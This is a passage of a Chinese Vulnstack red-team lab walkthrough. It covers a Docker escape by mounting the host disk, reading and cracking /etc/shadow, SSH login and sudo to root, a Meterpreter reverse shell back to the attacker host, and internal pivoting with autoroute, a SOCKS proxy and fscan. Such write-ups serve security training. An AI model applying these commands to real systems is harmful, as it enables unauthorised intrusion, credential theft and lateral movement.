-l\u003c/code\u003e查看磁盘，无回显（现在是\u003ccode\u003e2001\u003c/code\u003e端口获得的\u003ccode\u003eshell\u003c/code\u003e）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e# fdisk -l\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003etomcat\u003c/code\u003e获得的\u003ccode\u003eshell\u003c/code\u003e来查看磁盘，可以查看到\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e# fdisk -l\u003c/span\u003e\nDisk /dev/sda: \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e GiB, \u003cspan class=\"hljs-number\"\u003e10737418240\u003c/span\u003e bytes, \u003cspan class=\"hljs-number\"\u003e20971520\u003c/span\u003e sectors\nUnits: sectors of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e * \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e = \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e bytes\nSector size (logical/physical): \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e bytes / \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e bytes\nI/O size (minimum/optimal): \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e bytes / \u003cspan class=\"hljs-number\"\u003e512\u003c/span\u003e bytes\nDisklabel type: dos\nDisk identifier: \u003cspan class=\"hljs-number\"\u003e0x00063af9\u003c/span\u003e\n\nDevice     Boot    Start      End  Sectors Size Id Type\n/dev/sda1  *        \u003cspan class=\"hljs-number\"\u003e2048\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16779263\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e16777216\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003eG \u003cspan class=\"hljs-number\"\u003e83\u003c/span\u003e Linux\n/dev/sda2       \u003cspan class=\"hljs-number\"\u003e16781310\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20969471\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e4188162\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eG  \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e Extended\n/dev/sda5       \u003cspan class=\"hljs-number\"\u003e16781312\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e20969471\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e4188160\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003eG \u003cspan class=\"hljs-number\"\u003e82\u003c/span\u003e Linux swap / Solaris\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e判断特权模式\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecat /proc/self/status | grep CapEff\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e特权模式启动的话，\u003ccode\u003eCapEff\u003c/code\u003e对应的掩码值应该为\u003ccode\u003e0000003fffffffff\u003c/code\u003e或者是 \u003ccode\u003e0000001fffffffff\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E5%9B%9B)/image56.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e创建目录，并将分区挂载到目录中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emkdir test\nmount /dev/sda1 /test\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后已经将宿主机挂在到\u003ccode\u003etest\u003c/code\u003e目录下了\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003els -al /test\ntotal \u003cspan class=\"hljs-number\"\u003e120\u003c/span\u003e\ndrwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e .\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Dec  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e ..\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e bin\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e boot\ndrwxrwxr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e cdrom\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e dev\ndrwxr-xr-x \u003cspan class=\"hljs-number\"\u003e130\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e12288\u003c/span\u003e Dec  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e04\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e57\u003c/span\u003e etc\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e home\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e initrd.img -\u003e boot/initrd.img\u003cspan class=\"hljs-number\"\u003e-4.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-142\u003c/span\u003e-generic\ndrwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e lib\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e lib64\ndrwx------   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e16384\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e lost+found\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e media\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Apr \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2014\u003c/span\u003e mnt\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e opt\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Apr \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2014\u003c/span\u003e proc\ndrwx------   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e21\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e root\ndrwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e run\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root \u003cspan class=\"hljs-number\"\u003e12288\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e sbin\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e srv\ndrwxr-xr-x   \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2014\u003c/span\u003e sys\ndrwxrwxrwt   \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Dec  \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e05\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e17\u003c/span\u003e tmp\ndrwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e usr\ndrwxr-xr-x  \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e root root  \u003cspan class=\"hljs-number\"\u003e4096\u003c/span\u003e Mar  \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e var\nlrwxrwxrwx   \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e Jan \u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2020\u003c/span\u003e vmlinuz -\u003e boot/vmlinuz\u003cspan class=\"hljs-number\"\u003e-4.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-142\u003c/span\u003e-generic\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003eshadow\u003c/code\u003e文件，仅能看到\u003ccode\u003eubuntu\u003c/code\u003e用户有密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ecat /test/etc/shadow \nubuntu:$\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e$xJbww$Yknw8dsfh25t02/g2fM9g/:\u003cspan class=\"hljs-number\"\u003e18281\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e99999\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003e:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e拿到开膛手破解\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003ejohn pass.txt                                        \nWarning: detected hash type \u003cspan class=\"hljs-string\"\u003e\"md5crypt\"\u003c/span\u003e, but the \u003cspan class=\"hljs-built_in\"\u003estring\u003c/span\u003e is also recognized as \u003cspan class=\"hljs-string\"\u003e\"md5crypt-long\"\u003c/span\u003e\nUse the \u003cspan class=\"hljs-string\"\u003e\"--format=md5crypt-long\"\u003c/span\u003e option to force loading these as that type instead\nUsing \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e input encoding: UTF\u003cspan class=\"hljs-number\"\u003e-8\u003c/span\u003e\nLoaded \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e password \u003cspan class=\"hljs-title function_\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(md5crypt, crypt(\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e) $\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e$ (and variants) [MD5 \u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e AVX2 \u003cspan class=\"hljs-number\"\u003e8\u003c/span\u003ex3])\u003c/span\u003e\nWill run 8 OpenMP threads\nProceeding with single, rules:Single\nPress 'q' or Ctrl-C to \u003cspan class=\"hljs-built_in\"\u003eabort\u003c/span\u003e, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n\u003cspan class=\"hljs-title function_\"\u003eubuntu\u003c/span\u003e           \u003cspan class=\"hljs-params\"\u003e(ubuntu)\u003c/span\u003e     \n1g 0:00:00:00 DONE 1/3 \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-12\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-03\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e)\u003c/span\u003e 33.33g/s 6400p/s 6400c/s 6400C/s ubuntu..ubuntut\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e破解出密码 \u003ccode\u003eubuntu\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试登陆SSH\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003essh ubuntu@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128\u003c/span\u003e \nubuntu@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128'\u003c/span\u003es password: \nWelcome to Ubuntu \u003cspan class=\"hljs-number\"\u003e14.04\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e6\u003c/span\u003e LTS (GNU/Linux \u003cspan class=\"hljs-number\"\u003e4.4\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e-142\u003c/span\u003e-generic x86_64)\n\n * Documentation:  https:\u003cspan class=\"hljs-comment\"\u003e//help.ubuntu.com/\u003c/span\u003e\n\nYour Hardware Enablement \u003cspan class=\"hljs-title function_\"\u003eStack\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(HWE)\u003c/span\u003e is supported until April 2019.\nLast login: Thu Jan 23 20:50:17 2020 from 192.168.157.128\nubuntu@ubuntu:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功进入，查看IP信息等\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eubuntu@ubuntu:~$ ip add  \n\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP group \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e                                                                                                             \n    link/ether \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ec:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:b6:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003ea brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.255\u003c/span\u003e scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 fe80::\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003ec:\u003cspan class=\"hljs-number\"\u003e29f\u003c/span\u003ef:feb6:\u003cspan class=\"hljs-number\"\u003e474\u003c/span\u003ea/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link                                                                                                                                                                  \n       valid_lft forever preferred_lft forever                                                           \n\u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e: eth1: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu \u003cspan class=\"hljs-number\"\u003e1500\u003c/span\u003e qdisc pfifo_fast state UP group \u003cspan class=\"hljs-keyword\"\u003edefault\u003c/span\u003e qlen \u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e\n    link/ether \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003ec:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:b6:\u003cspan class=\"hljs-number\"\u003e47\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e54\u003c/span\u003e brd ff:ff:ff:ff:ff:ff\n    inet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e brd \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.255\u003c/span\u003e scope global eth1                                                                                                                                                 \n       valid_lft forever preferred_lft forever                                                           \n    inet6 fe80::\u003cspan class=\"hljs-number\"\u003e20\u003c/span\u003ec:\u003cspan class=\"hljs-number\"\u003e29f\u003c/span\u003ef:feb6:\u003cspan class=\"hljs-number\"\u003e4754\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e64\u003c/span\u003e scope link  \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以发现逃逸了\u003ccode\u003edocker\u003c/code\u003e环境，并且内网网段是\u003ccode\u003e192.168.183.0\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e内网信息收集\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看\u003ccode\u003eubuntu\u003c/code\u003e用户权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eubuntu@ubuntu:~$ sudo -i\n[sudo] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ubuntu: \nroot@ubuntu:~# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接到\u003ccode\u003eroot\u003c/code\u003e用户了，成功拿到\u003ccode\u003eweb\u003c/code\u003e主机的最高权限\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e将其上线MSF（和上面的方法一样）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e run\n\n[*] Started reverse TCP handler on 192.168.157.129:4445 \n[*] Sending \u003cspan class=\"hljs-title function_\"\u003estage\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e3045380\u003c/span\u003e bytes)\u003c/span\u003e to 192.168.157.128\n[*] Meterpreter session 2 \u003cspan class=\"hljs-title function_\"\u003eopened\u003c/span\u003e \u003cspan class=\"hljs-params\"\u003e(\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4445\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e37052\u003c/span\u003e)\u003c/span\u003e at 2024-12-03 13:29:59 +0800\n\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e首先将设置通向内网的路由，然后设置代理（方便后面使用）\u003c/p\u003e\n\u003cp\u003e添加路由\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e run post/multi/manage/autoroute \n\n[*] Running module against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.128\u003c/span\u003e\n[*] Searching \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e subnets to autoroute.\n[+] Route added to subnet \u003cspan class=\"hljs-number\"\u003e172.17\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e from host\u003cspan class=\"hljs-string\"\u003e's routing table.\n[+] Route added to subnet 172.18.0.0/255.255.0.0 from host'\u003c/span\u003es routing table.\n[+] Route added to subnet \u003cspan class=\"hljs-number\"\u003e172.19\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e from host\u003cspan class=\"hljs-string\"\u003e's routing table.\n[+] Route added to subnet 172.20.0.0/255.255.0.0 from host'\u003c/span\u003es routing table.\n[+] Route added to subnet \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e157.0\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e255.0\u003c/span\u003e from host\u003cspan class=\"hljs-string\"\u003e's routing table.\n[+] Route added to subnet 192.168.183.0/255.255.255.0 from host'\u003c/span\u003es routing table.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后设置代理\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003emeterpreter \u003e bg\n[*] Backgrounding session \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eexploit\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(multi/handler)\u003c/span\u003e \u003e use auxiliary/server/socks_proxy \nmsf6 \u003cspan class=\"hljs-title function_\"\u003eauxiliary\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(server/socks_proxy)\u003c/span\u003e \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e version 4a\nmsf6 \u003cspan class=\"hljs-title function_\"\u003eauxiliary\u003c/span\u003e\u003cspan class=\"hljs-params\"\u003e(server/socks_proxy)\u003c/span\u003e \u003e run\n[*] Auxiliary module running as background job 0.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后配置\u003ccode\u003echainproxy4\u003c/code\u003e的配置文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-meta\"\u003e# vim /etc/proxychains4.conf  \u003c/span\u003e\nsocks4  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试一下，我们知道\u003ccode\u003eweb\u003c/code\u003e主机内网地址是\u003ccode\u003e192.168.183.129\u003c/code\u003e ，使用\u003ccode\u003ecurl\u003c/code\u003e成功回显\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003eproxychains curl \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e                                                                \n[proxychains] config file found: /etc/proxychains4.conf                                                  \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.\u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e                                   \n[proxychains] DLL init: proxychains-ng \u003cspan class=\"hljs-number\"\u003e4.17\u003c/span\u003e                                                              \n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e2001\u003c/span\u003e  ...  OK                      \n\n\u0026#x3C;html\u003e                                              \n\u0026#x3C;head\u003e                                              \n   \u0026#x3C;title\u003eStruts2 Showcase - Fileupload sample\u0026#x3C;/title\u003e                                                   \n\u0026#x3C;/head\u003e                                                                       \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e使用\u003ccode\u003efscan\u003c/code\u003e扫描内网信息\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e将\u003ccode\u003efscan\u003c/code\u003e 上传到\u003ccode\u003eubuntu\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e靶机运行\u003ccode\u003efscan\u003c/code\u003e将结果保存到\u003ccode\u003e1.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e./fscan -h \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.1\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e24\u003c/span\u003e \u003e \u003cspan class=\"hljs-number\"\u003e1.\u003c/span\u003etxt\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e扫描完毕后查看\u003ccode\u003e1.txt\u003c/code\u003e结果\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e存活主机，除了\u003ccode\u003eweb\u003c/code\u003e主机内网还有两台\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e(icmp) Target \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.129\u003c/span\u003e is \u003cspan class=\"hljs-title function_\"\u003ealive\u003c/span\u003e   \n\u003cspan class=\"hljs-params\"\u003e(icmp)\u003c/span\u003e Target 192.168.183.130 is \u003cspan class=\"hljs-title function_\"\u003ealive\u003c/span\u003e  \n\u003cspan class=\"hljs-params\"\u003e(icmp)\u003c/span\u003e Target 192.168.183.131 is alive\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-c\"\u003e\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e open\n\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e183.130\u003c/span\u003e:\u003cspan 